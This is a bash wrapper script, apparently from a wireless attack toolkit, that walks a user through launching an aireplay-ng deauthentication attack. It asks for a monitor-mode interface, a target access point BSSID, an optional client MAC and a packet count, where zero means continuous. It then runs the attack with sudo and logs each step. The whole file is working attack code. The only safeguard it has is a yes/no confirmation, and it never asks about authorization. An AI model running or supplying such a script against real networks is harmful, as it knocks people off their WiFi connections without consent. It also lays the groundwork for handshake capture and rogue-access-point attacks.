#!/bin/bash

# Wrapper script for aireplay-ng

# Log file for the main toolkit
LOG_FILE="./toolkit.log" # Relative path to the main log file from project root

log_main_toolkit() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [run_aireplay-ng.sh] - $1" >> "$LOG_FILE"
}

echo "--- Aireplay-ng (WiFi Attack Tool) ---"
log_main_toolkit "Starting aireplay-ng wrapper script."

# Check if aireplay-ng is installed
if ! command -v aireplay-ng &> /dev/null; then
    echo "ERROR: aireplay-ng is not installed."
    echo "Please install the Aircrack-ng suite (e.g., 'sudo apt install aircrack-ng' or your distro's equivalent)."
    log_main_toolkit "ERROR: aireplay-ng not found. Advised user to install aircrack-ng."
    exit 1
fi

echo "aireplay-ng found."
log_main_toolkit "aireplay-ng found on system."

echo ""
echo "INFO: aireplay-ng is a powerful tool for generating WiFi traffic and can perform various attacks."
echo "A common use case is the deauthentication attack, which can disconnect clients from an AP."
echo "Ensure your wireless interface is in MONITOR MODE."
log_main_toolkit "Informed user about aireplay-ng use cases and monitor mode requirement."

# --- Gather parameters from the user ---
read -p "Enter the wireless interface name in monitor mode (e.g., wlan0mon): " interface_name
if [ -z "$interface_name" ]; then
    echo "ERROR: No interface name provided. Exiting."
    log_main_toolkit "ERROR: User did not provide an interface name."
    exit 1
fi
log_main_toolkit "User provided interface: $interface_name"

echo ""
echo "Select attack type:"
echo "  1) Deauthentication Attack (--deauth)"
# Add other common attacks here later if needed
read -p "Enter choice (e.g., 1): " attack_choice

attack_params=""
attack_desc=""

case $attack_choice in
    1)
        attack_desc="Deauthentication Attack"
        read -p "Enter number of deauth packets (e.g., 0 for continuous, 5 for five packets): " deauth_count
        if ! [[ "$deauth_count" =~ ^[0-9]+$ ]]; then
            echo "ERROR: Invalid number of packets. Must be an integer. Exiting."
            log_main_toolkit "ERROR: Invalid deauth packet count: $deauth_count"
            exit 1
        fi

        read -p "Enter the BSSID of the target Access Point (e.g., AA:BB:CC:DD:EE:FF): " ap_bssid
        if [ -z "$ap_bssid" ]; then # Basic check, can be improved with regex
            echo "ERROR: No BSSID provided. Exiting."
            log_main_toolkit "ERROR: User did not provide an AP BSSID."
            exit 1
        fi

        read -p "Enter the Client MAC address to target (optional, press Enter to skip/target broadcast): " client_mac
        
        attack_params="--deauth $deauth_count -a $ap_bssid"
        if [ -n "$client_mac" ]; then
            attack_params="$attack_params -c $client_mac"
            log_main_toolkit "Deauth attack selected: Count=$deauth_count, BSSID=$ap_bssid, ClientMAC=$client_mac"
        else
            log_main_toolkit "Deauth attack selected: Count=$deauth_count, BSSID=$ap_bssid (Broadcast)"
        fi
        ;;
    *)
        echo "ERROR: Invalid attack choice. Exiting."
        log_main_toolkit "ERROR: Invalid attack choice: $attack_choice"
        exit 1
        ;;
esac

echo ""
echo "Confirm Attack Details:"
echo "  Attack Type: $attack_desc"
echo "  Interface:   $interface_name"
echo "  Parameters:  $attack_params"
echo ""
read -p "Proceed with this attack? (yes/no): " confirm_attack

if [[ "$confirm_attack" != "yes" ]]; then
    echo "Attack cancelled by user."
    log_main_toolkit "User cancelled the attack."
    exit 0
fi

echo "Attempting to start aireplay-ng..."
echo "Command: sudo aireplay-ng $attack_params $interface_name"
echo "Press Ctrl+C to stop aireplay-ng (if applicable)."
log_main_toolkit "Executing: sudo aireplay-ng $attack_params $interface_name"

# Execute aireplay-ng
# Note: aireplay-ng typically requires root privileges.
sudo aireplay-ng $attack_params "$interface_name"

REPLAY_EXIT_CODE=$?

if [ $REPLAY_EXIT_CODE -eq 0 ]; then
    echo "aireplay-ng exited normally."
    log_main_toolkit "aireplay-ng exited normally (Exit code: $REPLAY_EXIT_CODE)."
else
    echo "aireplay-ng exited with code $REPLAY_EXIT_CODE."
    echo "This could be due to incorrect parameters, permissions, interface not in monitor mode, or other issues."
    log_main_toolkit "aireplay-ng exited with code $REPLAY_EXIT_CODE."
fi

exit $REPLAY_EXIT_CODE
